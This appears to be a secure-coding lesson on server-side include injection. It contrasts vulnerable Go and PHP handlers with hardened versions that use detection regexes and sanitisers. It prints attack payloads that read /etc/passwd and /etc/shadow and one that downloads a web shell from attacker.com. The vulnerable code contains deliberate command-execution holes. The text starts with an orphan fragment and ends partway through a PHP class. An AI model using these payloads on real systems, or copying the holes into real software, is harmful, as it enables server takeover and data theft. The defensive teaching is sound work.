**Additional Protections**:
- **WAF Rules**: Deploy ModSecurity or cloud WAF rules to block SSI patterns at the edge
- **File System Permissions**: SSI content directories should be read-only with strict ownership
- **Containerization**: Run SSI-processing components in isolated containers with no network egress
- **Monitoring & Alerting**: Set up alerts for SSI security events exceeding threshold (>5 per minute)
- **Regular Audits**: Quarterly review of SSI include paths and content for unauthorized changes
- **Migration Plan**: Document a roadmap to replace SSI with modern templating (Thymeleaf, FreeMarker)

Including user-provided content directly in templates without proper sanitization is extremely dangerous and can lead to Server-Side Include (SSI) injection attacks. When user input is processed by template engines or server-side include mechanisms, attackers can inject directives that execute commands on your server.

**VULNERABLE CODE**:

```go
package main

import (
	"html/template"
	"net/http"
	"os/exec"
)

type PageData struct {
	Title   string
	Content string
}

// VULNERABLE: Directly embedding user input into template
func handlePage(w http.ResponseWriter, r *http.Request) {
	userContent := r.URL.Query().Get("content")

	// Dangerous: Building template string with user input
	tmplStr := `<!DOCTYPE html>
<html>
<head><title>{{.Title}}</title></head>
<body>
<div>` + userContent + `</div>
</body>
</html>`

	tmpl, _ := template.New("page").Parse(tmplStr)
	data := PageData{Title: "My Page", Content: userContent}
	tmpl.Execute(w, data)
}

// VULNERABLE: Executing commands based on SSI-like directives
func processSSI(w http.ResponseWriter, r *http.Request) {
	content := r.FormValue("template")

	// Extremely dangerous: Processing SSI-like directives from user input
	if matched := ssiPattern.FindStringSubmatch(content); matched != nil {
		cmd := matched[1]
		output, _ := exec.Command("sh", "-c", cmd).Output()
		w.Write(output)
	}
}

func main() {
	http.HandleFunc("/page", handlePage)
	http.HandleFunc("/process", processSSI)
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload**:
```text
<!--#exec cmd="cat /etc/passwd" -->
<!--#include virtual="/etc/shadow" -->
{{.Content | printf "%s" | html}}
```

**Why This Is Dangerous**:
- User input is concatenated directly into template strings, allowing template injection
- SSI-like directive processing executes arbitrary shell commands
- No input validation or sanitization before processing
- Attackers can read sensitive files, execute commands, or pivot to other systems

**SECURE VERSION**:

```go
package main

import (
	"html/template"
	"log"
	"net/http"
	"regexp"
	"strings"
)

type PageData struct {
	Title   string
	Content template.HTML
}

// Precompiled template - never build templates from user input
var pageTemplate = template.Must(template.New("page").Parse(`<!DOCTYPE html>
<html>
<head><title>{{.Title}}</title></head>
<body>
<div>{{.Content}}</div>
</body>
</html>`))

// Dangerous SSI pattern detector
var ssiPattern = regexp.MustCompile(`<!--#(include|exec|echo|config|flastmod|fsize)\s`)

// Safe HTML sanitizer - removes dangerous patterns
func sanitizeContent(input string) string {
	// Remove SSI directives
	sanitized := ssiPattern.ReplaceAllString(input, "")

	// Remove script tags and event handlers
	scriptPattern := regexp.MustCompile(`(?i)<script[^>]*>.*?</script>`)
	sanitized = scriptPattern.ReplaceAllString(sanitized, "")

	// Remove template injection attempts
	tmplPattern := regexp.MustCompile(`\{\{.*?\}\}`)
	sanitized = tmplPattern.ReplaceAllString(sanitized, "")

	return sanitized
}

// SECURE: Use precompiled templates with proper escaping
func handlePageSecure(w http.ResponseWriter, r *http.Request) {
	userContent := r.URL.Query().Get("content")

	// Validate and sanitize input
	if len(userContent) > 10000 {
		http.Error(w, "Content too long", http.StatusBadRequest)
		return
	}

	// Check for SSI injection attempts
	if ssiPattern.MatchString(userContent) {
		log.Printf("SECURITY: SSI injection attempt detected from %s", r.RemoteAddr)
		http.Error(w, "Invalid content", http.StatusBadRequest)
		return
	}

	// Sanitize content
	safeContent := sanitizeContent(userContent)

	// Use template.HTMLEscapeString for additional safety
	data := PageData{
		Title:   "My Page",
		Content: template.HTML(template.HTMLEscapeString(safeContent)),
	}

	if err := pageTemplate.Execute(w, data); err != nil {
		log.Printf("Template execution error: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
	}
}

func main() {
	http.HandleFunc("/page", handlePageSecure)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Key Security Controls**:
- **Precompiled templates**: Templates are parsed at startup, never from user input
- **SSI pattern detection**: Detects and blocks SSI directive injection attempts
- **Input sanitization**: Removes dangerous patterns before processing
- **HTML escaping**: Uses template.HTMLEscapeString to neutralize special characters
- **Security logging**: Logs injection attempts for monitoring and alerting

When you need to allow limited HTML formatting while preventing SSI and other injection attacks, you need a comprehensive allowlist approach with production-grade monitoring, rate limiting, and defense in depth.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"html/template"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/microcosm-cc/bluemonday"
	"golang.org/x/time/rate"
)

// SecurityConfig holds production security settings
type SecurityConfig struct {
	MaxContentLength    int
	RateLimitPerMinute  int
	EnableAuditLog      bool
	BlocklistPatterns   []*regexp.Regexp
	Environment         string
}

var config = SecurityConfig{
	MaxContentLength:   50000,
	RateLimitPerMinute: 60,
	EnableAuditLog:     true,
	Environment:        os.Getenv("GO_ENV"),
}

// Rate limiter per IP
type IPRateLimiter struct {
	ips map[string]*rate.Limiter
	mu  sync.RWMutex
}

var rateLimiter = &IPRateLimiter{
	ips: make(map[string]*rate.Limiter),
}

func (r *IPRateLimiter) getLimiter(ip string) *rate.Limiter {
	r.mu.Lock()
	defer r.mu.Unlock()

	limiter, exists := r.ips[ip]
	if !exists {
		limiter = rate.NewLimiter(rate.Every(time.Minute/time.Duration(config.RateLimitPerMinute)), 10)
		r.ips[ip] = limiter
	}
	return limiter
}

// SecurityAuditLog for tracking suspicious activity
type SecurityAuditLog struct {
	Timestamp   time.Time `json:"timestamp"`
	IP          string    `json:"ip"`
	UserAgent   string    `json:"user_agent"`
	RequestPath string    `json:"request_path"`
	ThreatType  string    `json:"threat_type"`
	PayloadHash string    `json:"payload_hash"`
	Blocked     bool      `json:"blocked"`
}

func logSecurityEvent(r *http.Request, threatType, payload string, blocked bool) {
	if !config.EnableAuditLog {
		return
	}

	hash := sha256.Sum256([]byte(payload))
	auditLog := SecurityAuditLog{
		Timestamp:   time.Now().UTC(),
		IP:          getClientIP(r),
		UserAgent:   r.UserAgent(),
		RequestPath: r.URL.Path,
		ThreatType:  threatType,
		PayloadHash: hex.EncodeToString(hash[:8]),
		Blocked:     blocked,
	}

	log.Printf("SECURITY_AUDIT: %+v", auditLog)
	// In production: send to SIEM, Elasticsearch, or security monitoring
}

func getClientIP(r *http.Request) string {
	// Check X-Forwarded-For for proxied requests
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		ips := strings.Split(xff, ",")
		return strings.TrimSpace(ips[0])
	}
	return strings.Split(r.RemoteAddr, ":")[0]
}

// Comprehensive threat detection patterns
var threatPatterns = struct {
	SSI         *regexp.Regexp
	TemplateInj *regexp.Regexp
	ScriptTags  *regexp.Regexp
	EventHandlers *regexp.Regexp
	PhpTags     *regexp.Regexp
	FileInclusion *regexp.Regexp
}{
	SSI:         regexp.MustCompile(`(?i)<!--#(include|exec|echo|config|flastmod|fsize|printenv|set)\s`),
	TemplateInj: regexp.MustCompile(`\{\{[^}]*\}\}|\{%[^%]*%\}|\$\{[^}]*\}`),
	ScriptTags:  regexp.MustCompile(`(?i)<script[^>]*>|</script>|javascript:`),
	EventHandlers: regexp.MustCompile(`(?i)\s(on\w+)\s*=`),
	PhpTags:     regexp.MustCompile(`(?i)<\?php|<\?=|<\?\s`),
	FileInclusion: regexp.MustCompile(`(?i)\.\.[\\/]|/etc/|/proc/|file://`),
}

// ThreatDetectionResult holds analysis results
type ThreatDetectionResult struct {
	Detected    bool
	ThreatTypes []string
	Severity    string
}

func detectThreats(content string) ThreatDetectionResult {
	result := ThreatDetectionResult{}

	if threatPatterns.SSI.MatchString(content) {
		result.Detected = true
		result.ThreatTypes = append(result.ThreatTypes, "SSI_INJECTION")
		result.Severity = "CRITICAL"
	}

	if threatPatterns.TemplateInj.MatchString(content) {
		result.Detected = true
		result.ThreatTypes = append(result.ThreatTypes, "TEMPLATE_INJECTION")
		result.Severity = "HIGH"
	}

	if threatPatterns.ScriptTags.MatchString(content) {
		result.Detected = true
		result.ThreatTypes = append(result.ThreatTypes, "XSS_SCRIPT_TAG")
		result.Severity = "HIGH"
	}

	if threatPatterns.PhpTags.MatchString(content) {
		result.Detected = true
		result.ThreatTypes = append(result.ThreatTypes, "PHP_INJECTION")
		result.Severity = "CRITICAL"
	}

	if threatPatterns.FileInclusion.MatchString(content) {
		result.Detected = true
		result.ThreatTypes = append(result.ThreatTypes, "PATH_TRAVERSAL")
		result.Severity = "HIGH"
	}

	return result
}

// SafeHTMLSanitizer using bluemonday with strict allowlist
type SafeHTMLSanitizer struct {
	policy *bluemonday.Policy
}

func NewSafeHTMLSanitizer() *SafeHTMLSanitizer {
	// Create strict allowlist policy
	p := bluemonday.NewPolicy()

	// Only allow safe formatting tags
	p.AllowElements("b", "i", "u", "strong", "em", "p", "br", "ul", "ol", "li")

	// Allow links with strict restrictions
	p.AllowAttrs("href").OnElements("a")
	p.AllowRelativeURLs(false)
	p.RequireParseableURLs(true)
	p.AllowURLSchemes("https") // Only HTTPS links

	// Add nofollow and target to all links
	p.AddTargetBlankToFullyQualifiedLinks(true)
	p.RequireNoFollowOnLinks(true)

	return &SafeHTMLSanitizer{policy: p}
}

func (s *SafeHTMLSanitizer) Sanitize(content string) string {
	return s.policy.Sanitize(content)
}

var sanitizer = NewSafeHTMLSanitizer()

// Precompiled secure template
var secureTemplate = template.Must(template.New("page").Parse(`<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self'">
	<meta http-equiv="X-Content-Type-Options" content="nosniff">
	<title>{{.Title}}</title>
</head>
<body>
	<div class="content">{{.Content}}</div>
</body>
</html>`))

type SecurePageData struct {
	Title   string
	Content template.HTML
}

// Production-ready handler with all security controls
func handleSecureContent(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()

	clientIP := getClientIP(r)

	// Layer 1: Rate limiting
	if !rateLimiter.getLimiter(clientIP).Allow() {
		logSecurityEvent(r, "RATE_LIMIT_EXCEEDED", "", true)
		http.Error(w, "Too many requests", http.StatusTooManyRequests)
		return
	}

	// Layer 2: Content length validation
	userContent := r.FormValue("content")
	if len(userContent) > config.MaxContentLength {
		logSecurityEvent(r, "CONTENT_TOO_LARGE", "", true)
		http.Error(w, "Content exceeds maximum length", http.StatusBadRequest)
		return
	}

	// Layer 3: Threat detection
	threatResult := detectThreats(userContent)
	if threatResult.Detected {
		logSecurityEvent(r, strings.Join(threatResult.ThreatTypes, ","), userContent, true)

		// In production: trigger alert for critical threats
		if threatResult.Severity == "CRITICAL" {
			log.Printf("CRITICAL_THREAT: IP=%s Types=%v", clientIP, threatResult.ThreatTypes)
			// triggerSecurityAlert(threatResult)
		}

		http.Error(w, "Invalid content detected", http.StatusBadRequest)
		return
	}

	// Layer 4: HTML sanitization with allowlist
	safeContent := sanitizer.Sanitize(userContent)

	// Layer 5: Set security headers
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("X-Frame-Options", "DENY")
	w.Header().Set("X-XSS-Protection", "1; mode=block")
	w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'none'")
	w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")

	data := SecurePageData{
		Title:   "Safe Content Page",
		Content: template.HTML(safeContent),
	}

	// Layer 6: Execute template with timeout context
	select {
	case <-ctx.Done():
		http.Error(w, "Request timeout", http.StatusGatewayTimeout)
		return
	default:
		if err := secureTemplate.Execute(w, data); err != nil {
			log.Printf("ERROR: Template execution failed: %v", err)
			http.Error(w, "Internal server error", http.StatusInternalServerError)
		}
	}
}

func main() {
	// Environment-specific configuration
	if config.Environment == "production" {
		log.SetFlags(log.Ldate | log.Ltime | log.LUTC | log.Lshortfile)
		config.RateLimitPerMinute = 30 // Stricter in production
	}

	http.HandleFunc("/content", handleSecureContent)

	server := &http.Server{
		Addr:         ":8080",
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	log.Printf("Starting secure server on :8080 (env=%s)", config.Environment)
	log.Fatal(server.ListenAndServe())
}
```

**Defense in Depth Layers**:

1. **Rate Limiting**: Per-IP rate limiting prevents automated attacks and abuse
```go
if !rateLimiter.getLimiter(clientIP).Allow() {
    logSecurityEvent(r, "RATE_LIMIT_EXCEEDED", "", true)
    http.Error(w, "Too many requests", http.StatusTooManyRequests)
    return
}
```

2. **Multi-Pattern Threat Detection**: Catches SSI, template injection, XSS, and path traversal
```go
threatResult := detectThreats(userContent)
if threatResult.Detected {
    logSecurityEvent(r, strings.Join(threatResult.ThreatTypes, ","), userContent, true)
    http.Error(w, "Invalid content detected", http.StatusBadRequest)
    return
}
```

3. **Allowlist HTML Sanitization**: Uses bluemonday with strict tag allowlist
```go
p.AllowElements("b", "i", "u", "strong", "em", "p", "br", "ul", "ol", "li")
p.AllowURLSchemes("https") // Only HTTPS links allowed
```

**Additional Protections**:
- **Security headers**: CSP, X-Frame-Options, X-Content-Type-Options prevent various attack vectors
- **Audit logging with payload hashing**: Tracks attacks without storing full payloads (GDPR compliant)
- **Request timeouts**: Prevents resource exhaustion attacks
- **Environment-specific configuration**: Stricter limits in production
- **Precompiled templates**: Prevents template injection by design
- **Server timeouts**: ReadTimeout, WriteTimeout, IdleTimeout prevent slowloris attacks

Server-Side Includes (SSI) are extremely dangerous when combined with user input. SSI allows embedding server directives in HTML that get executed on the server. If user input flows into SSI-processed files without sanitization, attackers can execute arbitrary commands.

**VULNERABLE CODE**:

```php
<?php
// vulnerable_ssi.php - DANGEROUS: User input in SSI-processed content

$username = $_GET['name'];
$customMessage = $_GET['message'];

// Write user content to an SSI-enabled file
$templateContent = "
<html>
<head><title>Welcome Page</title></head>
<body>
    <h1>Welcome, $username!</h1>
    <div class='custom-message'>$customMessage</div>

    <!-- SSI directive to include footer -->
    <!--#include virtual='/includes/footer.shtml' -->

    <!-- Dynamic date display -->
    <!--#echo var='DATE_LOCAL' -->
</body>
</html>
";

// Save to .shtml file (SSI-enabled)
file_put_contents('/var/www/html/user_pages/' . $username . '.shtml', $templateContent);

header('Location: /user_pages/' . $username . '.shtml');
?>
```

**Attack Payload**:
```text
name=hacker&message=<!--#exec cmd="cat /etc/passwd" -->
```

Or more dangerous:
```text
message=<!--#exec cmd="wget http://attacker.com/shell.php -O /var/www/html/shell.php" -->
```

**Why This Is Dangerous**:
- User input is directly embedded into SSI-processed files without any sanitization
- The `<!--#exec cmd="..."-->` directive executes shell commands with web server privileges
- Attackers can read sensitive files, download malware, establish reverse shells
- SSI directives like `<!--#include-->` can include arbitrary files from the filesystem
- No validation on filename allows path traversal and file overwrites

**SECURE VERSION**:

```php
<?php
// secure_dynamic_content.php - Safe alternative to SSI

class SecureTemplateEngine {
    private $allowedVariables = ['username', 'message', 'date'];
    private $maxInputLength = 200;

    public function sanitizeInput(string $input): string {
        // Remove any SSI-like patterns completely
        $input = preg_replace('/<!--#.*?-->/s', '', $input);

        // HTML encode to prevent XSS
        $input = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');

        // Limit length
        return substr($input, 0, $this->maxInputLength);
    }

    public function sanitizeUsername(string $username): string {
        // Only allow alphanumeric characters
        $clean = preg_replace('/[^a-zA-Z0-9_]/', '', $username);
        return substr($clean, 0, 50);
    }

    public function renderTemplate(array $variables): string {
        $username = $this->sanitizeInput($variables['username'] ?? 'Guest');
        $message = $this->sanitizeInput($variables['message'] ?? '');
        $date = date('Y-m-d H:i:s'); // Server-side date, not SSI

        // Use PHP templating instead of SSI
        ob_start();
        ?>
        <html>
        <head><title>Welcome Page</title></head>
        <body>
            <h1>Welcome, <?= $username ?>!</h1>
            <div class="custom-message"><?= $message ?></div>
            <footer><?php include __DIR__ . '/includes/footer.php'; ?></footer>
            <p>Generated: <?= $date ?></p>
        </body>
        </html>
        <?php
        return ob_get_clean();
    }
}

// Usage
$engine = new SecureTemplateEngine();
$html = $engine->renderTemplate([
    'username' => $_GET['name'] ?? '',
    'message' => $_GET['message'] ?? ''
]);

echo $html;
?>
```

**Key Security Controls**:
- **SSI pattern removal**: Regex removes any SSI directive patterns from user input before processing
- **HTML encoding**: `htmlspecialchars()` prevents XSS and neutralizes any remaining special characters
- **PHP includes instead of SSI**: Using PHP's `include` with hardcoded paths is safer than SSI virtual includes
- **Input validation**: Strict character whitelist for usernames, length limits on all inputs
- **No dynamic file creation**: Content is rendered directly, not written to SSI-enabled files

If you must use SSI for legacy compatibility, you need a defense-in-depth approach: restrict Apache's SSI capabilities, sanitize all inputs rigorously, and implement monitoring.

**PRODUCTION PATTERN**:

```php
<?php
// secure_ssi_handler.php - Production-safe SSI integration

declare(strict_types=1);

class SecureSSIHandler {
    private PDO $db;
    private string $logFile;
    private array $ssiPatterns = [
        '/<!--#exec/i',
        '/<!--#cmd/i', 
        '/<!--#include\s+virtual/i',
        '/<!--#include\s+file/i',
        '/<!--#set/i',
        '/<!--#config/i',
        '/<!--#echo/i',
        '/<!--#fsize/i',
        '/<!--#flastmod/i',
        '/<!--#printenv/i',
        '/<!--.*?-->/s'  // Catch-all for any HTML comment that could be SSI
    ];

    public function __construct(PDO $db, string $logFile = '/var/log/app/ssi_security.log') {
        $this->db = $db;
        $this->logFile = $logFile;
    }

    public function detectSSIInjection(string $input): bool {
        foreach ($this->ssiPatterns as $pattern) {
            if (preg_match($pattern, $input)) {
                return true;
            }
        }
        // Also check for encoded variants
        $decoded = html_entity_decode(urldecode($input));
        foreach ($this->ssiPatterns as $pattern) {
            if (preg_match($pattern, $decoded)) {
                return true;
            }
        }
        return false;
    }

    public function sanitizeForSSI(string $input): string {
        // Multi-layer sanitization

        // Layer 1: Decode any encoding attempts
        $input = html_entity_decode(urldecode($input));

        // Layer 2: Remove ALL HTML comments (SSI uses comment syntax)
        $input = preg_replace('/<!--.*?-->/s', '', $input);

        // Layer 3: Remove angle brackets entirely for SSI contexts
        $input = str_replace(['<', '>', '"', "'", '`', '$', '!', '#'], '', $input);

        // Layer 4: Only allow safe characters
        $input = preg_replace('/[^a-zA-Z0-9\s\.,\-_@]/', '', $input);

        // Layer 5: Length limit
        return substr($input, 0, 500);
    }

    public function processUserContent(string $userId, string $content): array {
        $clientIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

        // Check for attack attempts
        if ($this->detectSSIInjection($content)) {
            $this->logSecurityEvent('SSI_INJECTION_ATTEMPT', [
                'user_id' => $userId,
                'ip' => $clientIP,
                'user_agent' => $userAgent,
                'payload' => substr($content, 0, 1000),
                'severity' => 'CRITICAL'
            ]);

            // Block the request
            $this->blockIP($clientIP);

            throw new SecurityException('Malicious input detected', 403);
        }

        // Sanitize content
        $safeContent = $this->sanitizeForSSI($content);

        // Log successful processing
        $this->logSecurityEvent('SSI_CONTENT_PROCESSED', [
            'user_id' => $userId,
            'ip' => $clientIP,
            'content_length' => strlen($safeContent)
        ]);

        return [
            'success' => true,
            'content' => $safeContent
        ];
    }

    private function logSecurityEvent(string $event, array $data): void {
        $logEntry = json_encode([
            'timestamp' => date('c'),
            'event' => $event,
            'data' => $data
        ]) . PHP_EOL;

        file_put_contents($this->logFile, $logEntry, FILE_APPEND | LOCK_EX);

        // For critical events, also write to database for analysis
        if (($data['severity'] ?? '') === 'CRITICAL') {
            $stmt = $this->db->prepare(
                'INSERT INTO security_events (event_type, ip_address, user_id, payload, created_at) 
                 VALUES (:event, :ip, :user_id, :payload, NOW())'
            );
            $stmt->execute([
                'event' => $event,
                'ip' => $data['ip'] ?? '',
                'user_id' => $data['user_id'] ?? '',
                'payload' => $data['payload'] ?? ''
            ]);
        }
    }

    private function blockIP(string $ip): void {
        // Add to temporary block list (integrate with fail2ban or firewall)
        $blockFile = '/var/run/blocked_ips.txt';
        file_put_contents($blockFile, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
}

class SecurityException extends Exception {}

